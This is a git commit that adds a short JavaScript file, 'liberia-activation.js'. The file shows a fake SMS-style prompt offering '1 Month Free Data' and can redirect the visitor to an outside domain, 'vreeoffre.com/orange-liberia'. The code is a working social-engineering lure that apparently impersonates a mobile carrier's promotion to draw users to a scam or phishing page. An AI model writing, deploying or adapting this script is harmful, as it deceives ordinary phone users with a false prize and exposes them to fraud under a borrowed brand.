29eb389c2f324fbbc9a34d787fe2363058fd61dc
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-01-31 16:20:57 +0100

    Create liberia-activation.js

---
+++ liberia-activation.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 1 MONTH FREE DATA'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 1 Month Free Data, click OK to Activate now','ACTIVATE 1 MONTH FREE DATA');
+if (password != 'ACTIVATE 1 MONTH FREE DATA') {
+location.href='https://vreeoffre.com/orange-liberia';
+}
